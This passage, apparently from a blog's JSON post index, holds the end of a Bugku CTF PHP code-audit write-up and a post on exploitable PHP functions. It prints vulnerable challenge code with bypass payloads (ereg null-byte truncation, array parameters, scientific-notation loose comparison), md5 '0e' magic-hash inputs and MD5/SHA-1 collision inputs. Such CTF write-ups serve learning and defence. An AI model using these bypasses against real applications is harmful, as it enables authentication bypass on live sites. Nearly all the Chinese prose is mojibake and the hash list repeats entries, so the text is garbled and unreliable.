($_GET[&#39;password&#39;]))&#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE) &#123; echo &#39; You password must be alphanumeric &#39;; &#125; else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999) &#123; if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® &#123; die(&#39;Flag: &#39; . $flag); &#125; else &#123; echo(&#39; - have not been found &#39;); &#125; &#125; else &#123; echo &#39; Invalid password &#39;; &#125;&#125;?&gt; eregå‡½æ•°å­˜åœ¨00æˆªæ–­æ¼æ´ï¼Œå½“eregè¯»å–å­—ç¬¦ä¸²stringæ—¶,å¦‚æœé‡åˆ°äº†%00,åé¢çš„å­—ç¬¦ä¸²å°±ä¸ä¼šè¢«è§£æ payload: ?password=1e9%00*-* 1e9æ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä»£è¡¨1x10^9 åˆ©ç”¨ereg()å‡½æ•°00æˆªæ–­æ¼æ´ï¼Œç»•è¿‡åŒ¹é… *-*ï¼Œåº”è¯¥æ˜¯é¢˜ç›®å‡ºé”™äº†ï¼Œä¸è¿‡æç¤ºé‡Œæœ‰ å¦å¤–ä¹Ÿå¯ä»¥ç›´æ¥ä¼ æ•°ç»„ payload: ?password[]=1 flag&#123;bugku-dm-sj-a12JH8&#125; strposæ•°ç»„ç»•è¿‡é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;ctf&#39;])) &#123;if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)echo &#39;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#39;;else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)die(&#39;Flag: &#39;.$flag);elseecho &#39;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#39;;&#125;?&gt;ereg()å‡½æ•°ä¼ å…¥æ•°ç»„ä¼šè¿”å›NULL,ä¸å¼ºç­‰äºFALSE,è¿›å…¥else ifstrpos()å‡½æ•°ä¼ å…¥æ•°ç»„ä¼šè¿”å›NULL,ä¸å¼ºä¸ç­‰äºFALSE,æ¡ä»¶æˆç«‹payload:?ctf[]&#x3D;flag&#123;Bugku-D-M-S-J572&#125;æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡é¢˜ç›®ä»£ç ï¼š&lt;?phperror_reporting(0);$flag &#x3D; &#39;flag&#123;test&#125;&#39;;if (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])&#123;$password &#x3D; $_POST[&#39;password&#39;];if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password)) &#x2F;&#x2F;preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…&#123;echo &#39;flag&#39;;exit;&#125;while (TRUE)&#123;$reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;if (6 &gt; preg_match_all($reg, $password, $arr))break;$c &#x3D; 0;$ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯foreach ($ps as $pt)&#123;if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))$c +&#x3D; 1;&#125;if ($c &lt; 3) break;&#x2F;&#x2F;&gt;&#x3D;3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Šif (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;else echo &#39;Wrong password&#39;;exit;&#125;&#125;?&gt; $_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»º è¿™é‡Œçš„$_SERVER[â€˜REQUEST_METHODâ€™]æŒ‡çš„æ˜¯è¯·æ±‚æäº¤æ•°æ®çš„æ–¹å¼ å¯ä»¥çœ‹åˆ°éœ€è¦POSTä¸€ä¸ªå‚æ•°ä¸ºpasswordçš„å˜é‡ ä¸‹é¢æ˜¯ä»£ç ä¸­çš„ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼è¯­æ³• [:alpha:] åŒ¹é…å½“å‰å½’ç±»ä¸­çš„å¤§å†™å’Œå°å†™å­—æ¯å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;[0-9]&#123;3&#125;[[:alpha:]]&#123;2&#125;&#39; åŒ¹é…ä¸‰ä¸ªæ•°å­—ï¼Œåè·Ÿä¸¤ä¸ªå­—æ¯ã€‚ [:alnum:] åŒ¹é…å½“å‰å½’ç±»ä¸­çš„æ•°å­—ã€å¤§å†™å’Œå°å†™å­—æ¯å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;[[:alnum:]]+&#39; åŒ¹é…å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ¯å’Œæ•°å­—çš„å­—ç¬¦ä¸²ã€‚ [:digit:] åŒ¹é…å½“å‰å½’ç±»ä¸­çš„æ•°å­—ã€‚ä¾‹å¦‚ï¼Œ&#39;[[:digit:]-]+&#39; åŒ¹é…å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—æˆ–æ¨ªçº¿çš„å­—ç¬¦ä¸²ã€‚åŒæ ·ï¼Œ&#39;[^[:digit:]-]+&#39; åŒ¹é…å«æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªä¸æ˜¯æ•°å­—æˆ–æ¨ªçº¿çš„å­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚ [:lower:] åŒ¹é…å½“å‰å½’ç±»ä¸­çš„å°å†™å­—æ¯å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;[[:lower:]]&#39; ä¸åŒ¹é… Aï¼Œå› ä¸º A ä¸ºå¤§å†™ã€‚ [:space:] åŒ¹é…å•ä¸ªç©ºæ ¼ (&#39; &#39;ï¼‰ [:upper:] åŒ¹é…å½“å‰å½’ç±»ä¸­çš„å¤§å†™å­—æ¯å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&#39;[[:upper:]ab]&#39; ä¸ä»¥ä¸‹å…¶ä¸­ä¸€é¡¹åŒ¹é…ï¼šä»»ä½•å¤§å†™å­—æ¯ã€a æˆ– bã€‚ [:whitespace:] åŒ¹é…ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œä¾‹å¦‚ï¼Œç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦å’Œå›è½¦ç¬¦ã€‚ [:ascii:] åŒ¹é…ä»»ä½•ä¸ƒä½çš„ ASCII å­—ç¬¦ï¼ˆ0 åˆ° 127 ä¹‹é—´çš„é¡ºåºå€¼ï¼‰ã€‚ [:blank:] åŒ¹é…ä¸€ä¸ªç©ºç™½åŒºæˆ–æ°´å¹³åˆ¶è¡¨ç¬¦ã€‚ [[:blank:]] ç­‰æ•ˆäº [ \\t]ã€‚ [:cntrl:] åŒ¹é…é¡ºåºå€¼å°äº 32 æˆ–å­—ç¬¦å€¼ä¸º 127 çš„ ASCII å­—ç¬¦ï¼ˆæ§åˆ¶å­—ç¬¦ï¼‰ã€‚æ§åˆ¶å­—ç¬¦åŒ…æ‹¬æ¢è¡Œç¬¦ã€æ¢é¡µç¬¦ã€é€€æ ¼ç¬¦ï¼Œç­‰ç­‰ã€‚ [:graph:] åŒ¹é…æ‰“å°å­—ç¬¦ã€‚ [[:graph:]] ç­‰æ•ˆäº [[:alnum:][:punct:]]ã€‚ [:print:] åŒ¹é…æ‰“å°å­—ç¬¦å’Œç©ºæ ¼ã€‚ [[:print:]] ç­‰æ•ˆäº [[:graph:][:whitespace:]]ã€‚ [:punct:] åŒ¹é…å…¶ä¸­ä¸€ä¸ªå­—ç¬¦ï¼š !&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~. [:punct:] å­å­—ç¬¦ç±»ä¸èƒ½åŒ…æ‹¬å½“å‰å½’ç±»ä¸­å¯ç”¨çš„é ASCII æ ‡ç‚¹å­—ç¬¦ã€‚ [:word:] åŒ¹é…å½“å‰å½’ç±»ä¸­çš„å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿å­—ç¬¦ã€‚ [[:word:]] ç­‰æ•ˆäº [[:alnum:]_]ã€‚ [:xdigit:] åŒ¹é…å­—ç¬¦ç±» [0-9A-Fa-f] ä¸­çš„å­—ç¬¦ã€‚ preg_match() å‡½æ•°è¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯ 0 æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ– 1 æ¬¡ï¼Œå› ä¸º preg_match() åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) $pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå­—ç¬¦ä¸²å½¢å¼ $subject: è¾“å…¥å­—ç¬¦ä¸² åˆ†æä»£ç å¯çŸ¥ï¼Œä¼ å…¥å‚æ•°å¿…é¡»ä½¿ç”¨POSTæ–¹æ³•ï¼Œè¿™é¢˜å¥½åƒå‡ºé”™äº†ï¼Œåªè¦POSTä¸€ä¸ªæ•°æ®å°±å¯ä»¥å¾—åˆ°flag æ­£ç¡®çš„è§£é¢˜æ–¹æ³•åº”è¯¥æ˜¯ï¼š ç”±è¦è®©0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)ä¸ºFALSEå¯çŸ¥passwordçš„é•¿åº¦åº”è¯¥åœ¨12ä¸ªå­—ç¬¦åŠä»¥ä¸Š(éç©ºæ ¼éTABä¹‹å¤–çš„å†…å®¹) ç”± 12$reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;; if (6 &gt; preg_match_all($reg, $password, $arr)) å¯çŸ¥ï¼ŒåŒ¹é…åˆ°çš„æ¬¡æ•°è¦å¤§äº6æ¬¡ï¼ˆä»»æ„å­—ç¬¦æˆ–å¤§å°å†™å­—æ¯æˆ–æ•°å­—ï¼‰ ç”± 1234567$ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯ foreach ($ps as $pt) &#123; if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password)) $c +&#x3D; 1; &#125; if ($c &lt; 3) break; å¯çŸ¥ï¼Œå¿…é¡»è¦æœ‰å¤§å°å†™å­—æ¯ï¼Œæ•°å­—ï¼Œå­—ç¬¦å†…å®¹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š 1if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag; å¿…é¡»å¼±ç­‰äº42 payloadï¼šPOSTè¿‡å» password=42.0000e%2b000000000 password=420.000000000000e-1 %2bä¸º+å·çš„urlç¼–ç ï¼Œ-å·çš„urlç¼–ç ä¸º- è¿™é‡Œç”¨çš„æ˜¯ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ å‡ºç°flag&#123;test&#125;æ‰æ„å‘³ç€å¾—åˆ°çœŸæ­£çš„flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"bugku","slug":"bugku","permalink":"http://www.m00nback.xyz/tags/bugku/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://www.m00nback.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"phpä¸€äº›å¸¸è§å‡½æ•°æ¼æ´","slug":"php-function-leak","date":"2019-09-25T14:16:40.000Z","updated":"2020-09-06T07:00:37.210Z","comments":true,"path":"2019/09/25/php-function-leak/","link":"","permalink":"http://www.m00nback.xyz/2019/09/25/php-function-leak/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†phpçš„ä¸€äº›å¸¸è§å‡½æ•°çš„æ¼æ´ï¼","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†phpçš„ä¸€äº›å¸¸è§å‡½æ•°çš„æ¼æ´ï¼ md5()å‡½æ•°md5å¼±æ¯”è¾ƒPHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚ æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œé€šè¿‡è¾“å…¥ä¸€ä¸ªç»è¿‡å“ˆå¸Œåä»¥â€0Eâ€å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œå³ä¼šè¢«PHPè§£é‡Šä¸º0ï¼Œå¦‚æœæ•°æ®åº“ä¸­å­˜åœ¨è¿™ç§å“ˆå¸Œå€¼ä»¥â€0Eâ€å¼€å¤´çš„å¯†ç çš„è¯ï¼Œä»–å°±å¯ä»¥ä»¥è¿™ä¸ªç”¨æˆ·çš„èº«ä»½ç™»å½•è¿›å»ï¼Œå°½ç®¡å¹¶æ²¡æœ‰çœŸæ­£çš„å¯†ç ã€‚ ä½†å¹¶ä¸æ˜¯æ‰€æœ‰MD5å€¼0eå¼€å¤´çš„éƒ½å¼±ç›¸ç­‰ï¼Œåªæœ‰ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œå³åé¢æ˜¯çº¯æ•°å­—çš„ 0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š 240610708 0e462097431906509019562988736854 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 è¿˜æœ‰MD5å’ŒåŒMD5ä»¥åçš„å€¼éƒ½æ˜¯0eå¼€å¤´çš„ CbDLytmyGm2xQyaLNhWn 770hQgrBOjrcqftrlaZk 7r4lGXCH2Ksu2JNT3BYM ä¸èƒ½å¤„ç†æ•°ç»„md5()å‡½æ•°å’Œsha1()å‡½æ•°ä¸€æ ·ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›å·²è®¡ç®—çš„å“ˆå¸Œæ•£åˆ—ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›NULLï¼Œå¯¹äºä¸€äº›æ¯”è¾ƒå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•ç»•è¿‡ md5ç¢°æ’ä¸¤ä¸ªMD5ç›¸åŒçš„ä¸åŒå­—ç¬¦ä¸² Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 sha1()å‡½æ•°ä¹Ÿæœ‰ç›¸ä¼¼çš„ç¢°æ’ a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp; b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 æ³¨æ„æäº¤æ—¶ä½¿ç”¨bpæŠ“åŒ…ï¼Œä¸èƒ½ç›´æ¥æäº¤ï¼Œå¦åˆ™çš„è¯æµè§ˆå™¨è§£ç ï¼Œæ•°æ®ä¼šä¸å®Œæ•´ï¼Œå…¶å®å°±ç›¸å½“äºæ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„hash strcmp()å‡½æ•°strcmp() å‡½æ•°ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸² å‡è®¾æ¯”è¾ƒçš„ä¸¤å­—ç¬¦ä¸²ä¸ºstring1å’Œstring2ï¼Œå‡½æ•°çš„è¿”å›å€¼å°†æœ‰ä¸‹é¢ä¸‰ç§æƒ…å†µï¼š 0 - å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ &lt;0 - å¦‚æœ string1 å°äº string2 0 - å¦‚æœ string1 å¤§äº string2 å½“æ¯”è¾ƒæ•°ç»„å’Œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¿”å›æ˜¯NULL is_numeric()å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œæ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE,åŒ…æ‹¬æ•°ç»„ is_numeric()å‡½æ•°æ£€æµ‹çš„æ—¶å€™ä¼šè‡ªåŠ¨è¿‡æ»¤æ‰å‰é¢çš„ â€˜ â€˜, â€˜\\tâ€™, â€˜\\nâ€™, â€˜\\râ€™, â€˜\\vâ€™, â€˜\\fâ€™ç­‰å­—ç¬¦ï¼Œä½†æ˜¯ä¸ä¼šè¿‡æ»¤ â€˜\\0â€™ï¼Œå¦‚æœè¿™äº›å­—ç¬¦å‡ºç°åœ¨å­—ç¬¦ä¸²å°¾ï¼Œä¹Ÿä¸ä¼šè¿‡æ»¤ï¼Œè€Œæ˜¯è¿”å› falseã€‚ var_dump(is_numeric(&quot;\\01&quot;)); // false var_dump(is_numeric(&quot; 1&quot;)); // true var_dump(is_numeric(&quot;\\t1&quot;)); // true var_dump(is_numeric(&quot;\\n1&quot;)); // true var_dump(is_numeric(&quot;\\r1&quot;)); // true var_dump(is_numeric(&quot;\\v1&quot;)); // true var_dump(is_numeric(&quot;\\f1&quot;)); // true var_dump(is_numeric(&quot;\\f\\f1&quot;)); // true var_dump(is_numeric(&quot;1\\f&quot;)); // false å¦‚æœæœ‰ä¸¤ä¸ªis_numericåˆ¤æ–­çš„æ—¶å€™ç”¨andè¿æ¥èµ·æ¥ï¼Œandåé¢çš„is_numbericåˆ¤æ–­å¯å¿½ç•¥ is_numeric(&#39;1&#39;) and is_numeric(&#39;a&#39;) //true ereg()å‡½æ•°ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚ å¦‚æœæ²¡æœ‰ä¼ é€’å…¥å¯é€‰å‚æ•° regs æˆ–è€…æ‰€åŒ¹é…çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º 0ï¼Œåˆ™æœ¬å‡½æ•°è¿”å› 1 int ereg ( string $pattern , string $string [, array &amp;$regs ] ) åˆ©ç”¨ï¼š eregå‡½æ•°å­˜åœ¨00æˆªæ–­æ¼æ´ï¼Œå½“eregè¯»å–å­—ç¬¦ä¸²stringæ—¶,å¦‚æœé‡åˆ°äº†%00,åé¢çš„å­—ç¬¦ä¸²å°±ä¸ä¼šè¢«è§£æã€‚ eregå‡½æ•°å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›NULL strpos()å‡½æ•°ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® int strpos( string $haystack, mixed $needle[, int $offset = 0] ) haystack åœ¨è¯¥å­—ç¬¦ä¸²ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚ needle å¦‚æœ needle ä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå®ƒå°†è¢«è½¬æ¢ä¸ºæ•´å‹å¹¶è¢«è§†ä¸ºå­—ç¬¦çš„é¡ºåºå€¼ã€‚ offset å¦‚æœæä¾›äº†æ­¤å‚æ•°ï¼Œæœç´¢ä¼šä»å­—ç¬¦ä¸²è¯¥å­—ç¬¦æ•°çš„èµ·å§‹ä½ç½®å¼€å§‹ç»Ÿè®¡ã€‚å¦‚æœæ˜¯è´Ÿæ•°ï¼Œæœç´¢ä¼šä»å­—ç¬¦ä¸²ç»“å°¾æŒ‡å®šå­—ç¬¦æ•°å¼€å§‹ã€‚ å¦‚æœæ²¡æ‰¾åˆ° needleï¼Œå°†è¿”å› FALSEã€‚ åˆ©ç”¨å½“$haystackä¸ºæ•°ç»„æ—¶ï¼Œå‡½æ•°è¿”å›NULLï¼Œå½“$needleä¸ºæ•°ç»„æ—¶å‡½æ•°è¿”å›flase preg_match()å‡½æ•°é™åˆ¶å¼€å¤´ç»“å°¾ï¼Œä¸æ˜¯å¤šè¡ŒåŒ¹é…ï¼Œå¦‚ 123456789&lt;?php$json = &quot;\\nflag&quot;;if (preg_match(&#x27;/^flag$/&#x27;, $json)) &#123; echo &#x27;hacker&#x27;;&#125;else&#123; echo 123;&#125;// è¾“å‡º123 å¦å¤–è¿˜æœ‰æœ€å¤§æ¬¡æ•°æ­£åˆ™å›æº¯ç»•è¿‡ intvalå‡½æ•°Intvalå‡½æ•°ç”¨äºè·å–å˜é‡æ•´æ•°æ•°å€¼Intvalæœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿã€‚ 32 ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ integer èŒƒå›´æ˜¯ -2147483648 åˆ° 2147483647ã€‚ä¸¾ä¾‹ï¼Œåœ¨è¿™æ ·çš„ç³»ç»Ÿä¸Šï¼Œ intval(â€˜1000000000000â€™) ä¼šè¿”å› 2147483647ã€‚64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§å¸¦ç¬¦å·çš„ integer å€¼æ˜¯ 9223372036854775807ã€‚ è¿™ä¸ªæœ‰ä¸ªåº”ç”¨å°±æ˜¯åœ¨åˆ¤æ–­æ•°å€¼æ˜¯ä¸æ˜¯å›æ–‡ä¸Šï¼Œå¦‚æœå‚æ•°ä¸º2147483647ï¼Œé‚£ä¹ˆå½“å®ƒåè¿‡æ¥ï¼Œç”±äºè¶…å‡ºäº†é™åˆ¶ï¼Œæ‰€ä»¥ä¾ç„¶ç­‰äº2147483647ã€‚å³ä¸ºå›æ–‡ã€‚ intvalå‡½æ•°èƒ½è¢«%00æˆªæ–­ï¼Œä¾‹å¦‚ï¼š 1234567&lt;?php$number=&#x27;0&#x27;.chr(0).&#x27;123&#x27;;var_dump(intval($number));if($number!=strval(intval($number)))&#123; echo 123;&#125;// è¾“å‡º123 switchå‡½æ•°å¦‚æœswitchæ˜¯æ•°å­—ç±»å‹çš„caseçš„åˆ¤æ–­æ—¶ï¼Œswitchä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸ºintç±»å‹ï¼Œæ•ˆæœç›¸å½“äºintvalå‡½æ•°ï¼Œä¾‹å¦‚ï¼š 123456789101112&lt;?php$i =&quot;abc&quot;; switch ($i) &#123; case 0: echo 123; break; case 1: echo 456; break;&#125; ?&gt;// è¾“å‡º123 switchæ²¡æœ‰ç¢°åˆ°breakæ—¶ä¼šä¸€ç›´å¾€ä¸‹æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°break,ä¾‹å¦‚ï¼š 1234567891011&lt;?php$i =&quot;abc&quot;; switch ($i) &#123; case 0: echo 123; case 1: echo 456; break;&#125;// è¾“å‡º123456","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"phpå‡½æ•°","slug":"phpå‡½æ•°","permalink":"http://www.m00nback.xyz/tags/php%E5%87%BD%E6%95%B0/"}]},{"title":"æ–‡ä»¶åŒ…å«æ¼æ´åŠåˆ©ç”¨æ–¹å¼","slug":"file-contant-leak","date":"2019-09-20T11:55:59.000Z","updated":"2020-02-16T07:16:09.554Z","comments":true,"path":"2019/09/20/file-contant-leak/","link":"","permalink":"http://www.m00nback.xyz/2019/09/20/file-contant-leak/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ–‡ä»¶åŒ…å«æ¼æ´åŠåˆ©ç”¨æ–¹å¼ï¼","text":"æœ¬